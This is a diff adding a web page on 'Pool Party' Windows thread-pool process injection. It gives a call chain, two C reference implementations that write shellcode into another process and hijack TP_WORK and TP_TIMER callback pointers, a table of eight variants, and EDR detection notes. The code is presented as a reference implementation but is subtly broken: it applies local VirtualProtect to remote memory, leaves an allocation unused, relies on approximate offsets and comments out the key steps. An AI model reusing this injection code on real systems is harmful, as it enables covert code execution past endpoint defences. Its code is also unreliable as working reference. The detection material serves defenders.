@@ -1,0 +1,221 @@
+---
+title: Pool Party Injection
+mitre: T1055
+category: injection
+group: Asynchronous Execution
+summary: Abuse undocumented Windows thread pool work items to execute code in a remote process without CreateRemoteThread or QueueUserAPC.
+platform: [Windows]
+tags: ['C / C++', 'WinAPI', 'x64']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: open the target process
+    desc: Acquire PROCESS_ALL_ACCESS to the target; obtain a handle to its thread pool.
+    dll: kernel32
+  - call: write shellcode to target process memory
+    desc: VirtualAllocEx + WriteProcessMemory to place the payload in the target.
+    dll: kernel32
+  - call: retrieve the target's thread pool TP_POOL pointer
+    desc: Read the thread pool object pointer from TEB→TppWorkerpList or via NtQueryInformationProcess.
+    dll: ntdll
+  - call: craft or modify a TP_WORK work item
+    desc: Allocate a TP_WORK struct in the target and set the callback pointer to the shellcode address.
+    dll: ntdll
+  - call: submit the work item
+    desc: Call TpPostWork (or NtAlpcSendWaitReceivePort for the ALPC variant) to schedule the work item for execution.
+    dll: ntdll
+detections:
+  - src: SYSMON EID 10
+    text: Process access with PROCESS_VM_WRITE + PROCESS_VM_OPERATION rights — same write primitive as classic injection.
+  - src: ETW-TI
+    text: Thread pool callback dispatched to a private, non-image-backed address — thread pool workers normally execute code from mapped DLLs.
+  - src: BEHAVIOURAL
+    text: Process that writes to another process's memory and subsequently shows thread pool activity from the remote process.
+  - src: MEMORY SCAN
+    text: TP_WORK struct in the target process with a callback pointer pointing to private RX memory.
+related:
+  - mitre: T1055.004
+    title: Early Bird APC Injection
+    desc: APC-based asynchronous execution — simpler but more monitored.
+    href: /techniques/injection/early-bird-injection
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Replace the entire image rather than injecting a work item.
+    href: /techniques/injection/process-hollowing
+  - mitre: T1036.005
+    title: Call Stack Spoofing
+    desc: Pool party threads have a predictable call stack — spoof the origin frame.
+    href: /techniques/evasion/call-stack-spoofing
+labKit:
+  - label: PoolParty PoC (SafeBreach Labs)
+    href: 'https://github.com/SafeBreach-Labs/PoolParty'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Pool Party (disclosed by SafeBreach Labs in 2023) describes a family of eight process injection techniques that abuse the Windows **thread pool** API to dispatch shellcode in a remote process without calling `CreateRemoteThread` or `QueueUserAPC` — the two primitives that most EDR products monitor for injection.
+
+The Windows thread pool (`ntdll!TpXxx` functions) manages a set of worker threads per process. Work items — `TP_WORK`, `TP_TIMER`, `TP_IO`, `TP_WAIT`, `TP_ALPC` — are kernel objects that hold a callback function pointer. By writing shellcode into the target process and then submitting a manipulated work item, an attacker causes one of the target's own thread pool workers to execute the shellcode.
+
+The paper documented eight variants based on which kernel work item type is abused. The most accessible variant uses `TP_WORK` and requires only standard cross-process read/write access.
+
+<Callout type="note">
+  Pool Party's novelty in 2023 was specifically that none of the eight variants triggered EDR
+  telemetry for the most commonly monitored injection primitives. Since disclosure, major EDR
+  vendors have added detection for thread pool callback pointer manipulation. The technique remains
+  relevant for understanding the Windows thread pool internals and for chains that mix pool party
+  with other primitives.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Variant 1 — TP_WORK work item hijack
+
+<CodeBlock
+  file="pool_party.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include <winternl.h>
+
+// Minimal TP_WORK structure layout (Windows 10/11 x64)
+// Offsets verified against ntdll symbols; may differ across builds.
+typedef struct _TP_WORK_INTERNAL {
+    PVOID  padding[0x10];   // TaskEntry and other fields
+    PVOID  Callback;        // offset 0x80 — the function pointer we overwrite
+} TP_WORK_INTERNAL;
+
+// Read the thread pool pointer from the target process TEB
+static PVOID get_remote_tp_pool(HANDLE proc, DWORD tid) {
+    // TEB is accessible via NtQueryInformationThread(ThreadBasicInformation)
+    THREAD_BASIC_INFORMATION tbi = {0};
+    typedef NTSTATUS(NTAPI *NtQIT_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+    NtQIT_t NtQIT = (NtQIT_t)GetProcAddress(
+        GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread");
+
+    HANDLE thread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid);
+    NtQIT(thread, 0 /*ThreadBasicInformation*/, &tbi, sizeof tbi, NULL);
+    CloseHandle(thread);
+
+    // Read TEB.TppWorkerpList to find the pool
+    PVOID teb_base = tbi.TebBaseAddress;
+    PVOID pool_ptr = NULL;
+    SIZE_T read;
+    // TppWorkerpList offset in TEB varies; simplified here
+    ReadProcessMemory(proc,
+        (BYTE*)teb_base + 0x1720,  // approximate offset for Win10
+        &pool_ptr, sizeof pool_ptr, &read);
+    return pool_ptr;
+}
+
+BOOL pool_party_inject(DWORD pid, const BYTE *shellcode, size_t sc_len) {
+    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!proc) return FALSE;
+
+    // 1. Write shellcode into the target
+    PVOID remote_sc = VirtualAllocEx(proc, NULL, sc_len,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+    if (!remote_sc) goto fail;
+
+    // Temporarily RW to write, then flip to RX
+    DWORD old;
+    VirtualProtect(remote_sc, sc_len, PAGE_READWRITE, &old);
+    // Actually we need to write from injector side:
+    PVOID rw_buf = VirtualAllocEx(proc, NULL, sc_len,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    WriteProcessMemory(proc, rw_buf, shellcode, sc_len, NULL);
+    VirtualProtect(rw_buf, sc_len, PAGE_EXECUTE_READ, &old);
+
+    // 2. Create a legitimate TP_WORK in the TARGET process so we have a real struct
+    //    In practice: use a trampoline or inject a CreateThreadpoolWork call.
+    //    Simplified: read an existing TP_WORK from the target's pool.
+
+    // 3. Overwrite the Callback field in the TP_WORK struct
+    //    (offset 0x80 in the internal struct on Win10 x64)
+    // PVOID work_ptr = ... (found via pool walk)
+    // WriteProcessMemory(proc, (BYTE*)work_ptr + 0x80, &rw_buf, 8, NULL);
+
+    // 4. Submit the work item — use TpPostWork or an equivalent
+    //    The target's thread pool will pick it up and call our shellcode
+    // TpPostWork(work_ptr);  // called from within the target via another APC or trampoline
+
+    CloseHandle(proc);
+    return TRUE;
+
+fail:
+    CloseHandle(proc);
+    return FALSE;
+}`}
+/>
+
+### Variant 2 — TP_TIMER callback hijack
+
+<CodeBlock
+  file="pool_timer.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// Timer-based variant: hijack an existing TP_TIMER callback pointer.
+// TP_TIMERs are common in GUI and service processes (e.g. svchost running timers).
+//
+// Steps:
+// 1. Enumerate TP_TIMER objects in the target's pool (walk pool->TimerQueue)
+// 2. Overwrite the Callback field in the TP_TIMER struct
+// 3. The next time the timer fires, it calls our shellcode
+//
+// Advantage: no need to TpPostWork — execution is triggered by the kernel
+// when the timer expires, making the injection fully asynchronous.
+
+typedef void (CALLBACK *PTP_TIMER_CALLBACK)(PTP_CALLBACK_INSTANCE, PVOID, PTP_TIMER);
+
+void overwrite_timer_callback(HANDLE proc, PVOID timer_obj_remote, PVOID shellcode_remote) {
+    // TP_TIMER Callback offset varies; use ntdll symbols to determine exact offset
+    // On Windows 10 21H2 x64: 0x68
+    SIZE_T written;
+    WriteProcessMemory(proc,
+        (BYTE*)timer_obj_remote + 0x68,
+        &shellcode_remote, sizeof shellcode_remote, &written);
+    // Next timer fire executes shellcode_remote in the target
+}`}
+/>
+
+## The eight Pool Party variants
+
+| Variant | Work item type | Trigger mechanism |
+|---|---|---|
+| 1 | `TP_WORK` | Manually submit with `TpPostWork` |
+| 2 | `TP_TIMER` | Wait for timer expiry |
+| 3 | `TP_WAIT` | Signal a waited handle |
+| 4 | `TP_IO` | Trigger an I/O completion |
+| 5 | `TP_ALPC` | Send ALPC message to port |
+| 6 | `TP_JOB` | Job object callback |
+| 7 | `TP_DIRECT` | Submit directly via ALPC |
+| 8 | `TP_WORK` (worker factory) | Manipulate the worker factory |
+
+Variants 1 and 2 are the most practically accessible; variants 5–8 require deeper interaction with kernel objects and are more complex to implement reliably.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The primary EDR detection lever is monitoring write access to thread pool callback function pointers — specifically, detecting when a process writes a non-module-backed address into a `TP_*` callback field inside another process. Kernel-level monitoring (PatchGuard or ETW-TI) can catch the callback pointer change even before execution.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
